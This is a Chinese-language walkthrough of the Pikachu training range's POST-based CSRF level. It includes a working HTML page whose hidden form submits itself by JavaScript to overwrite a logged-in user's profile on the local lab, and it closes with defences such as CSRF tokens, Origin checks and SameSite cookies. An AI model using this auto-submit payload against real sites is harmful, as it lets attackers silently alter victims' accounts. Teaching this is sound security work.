## 一、题目信息
- 平台：Pikachu
- 分类：CSRF -> csrf(post)
- 难度：中等
- 通关标识：通过自建恶意 HTML 页面，利用自动提交表单修改个人信息

## 二、考点
1. CSRF（跨站请求伪造）POST 型利用
2. 恶意 HTML 表单的构造与自动提交
3. 浏览器同源策略与 Cookie 机制

## 三、题目内容
本关卡与 CSRF(get) 类似，但修改个人信息的请求改为了 **POST** 方式。由于参数不暴露在 URL 中，攻击者无法直接构造链接，需要自行编写一个包含恶意表单的 HTML 页面，诱导受害者访问并触发自动提交。

## 四、解题步骤

**1. 抓取正常请求**
登录系统，进入个人信息修改页面，修改信息并抓包。确认修改信息的请求为 POST 方式，目标 URL 为：
`http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php`

**2. 构造恶意 HTML 页面**
在本地新建一个 `hack.html` 文件，写入一个隐藏的 POST 表单，并使用 JavaScript 自动提交：
```html
<html>
  <body>
    <form action="http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST" id="hack_form">
      <input type="hidden" name="sex" value="hacker" />
      <input type="hidden" name="phonenum" value="88888888" />
      <input type="hidden" name="add" value="hacked" />
      <input type="hidden" name="email" value="hack@hack.com" />
      <input type="hidden" name="submit" value="submit" />
    </form>
    <script>
      document.getElementById("hack_form").submit();
    </script>
  </body>
</html>
```

**3. 触发漏洞**
保持靶场处于登录状态。在浏览器中打开该 `hack.html` 文件。页面会瞬间自动提交表单向靶场发送 POST 请求。
返回靶场的个人信息页面并刷新，发现信息已被成功修改为 `hacker` / `88888888`，CSRF 攻击成功。

## 五、知识点解析
1. **POST 型 CSRF**：虽然 POST 请求的参数在请求体中不易伪造链接，但攻击者可以通过构造一个自动提交的恶意表单，诱导受害者访问。浏览器在请求目标时，默认会带上目标站点的 Cookie。
2. **自动提交**：使用 JavaScript 的 `form.submit()` 方法，可以在用户毫无察觉的情况下静默发送请求，隐蔽性极强。

## 六、总结与防御
**本题总结**：
CSRF 防御不能仅仅依赖“把 GET 改成 POST”。只要没有验证请求的合法性（如 Token），任何请求方式都可能被伪造。

**安全防御建议**：
- **核心防御：CSRF Token**：在每次敏感请求中加入不可预测的随机 Token，并在服务端进行校验。
- **校验 Referer/Origin 头**：验证请求是否来源于本站受信任的域名。
- **设置 SameSite Cookie**：将重要 Cookie 设为 `SameSite=Strict` 或 `Lax`，阻断跨站请求携带 Cookie。
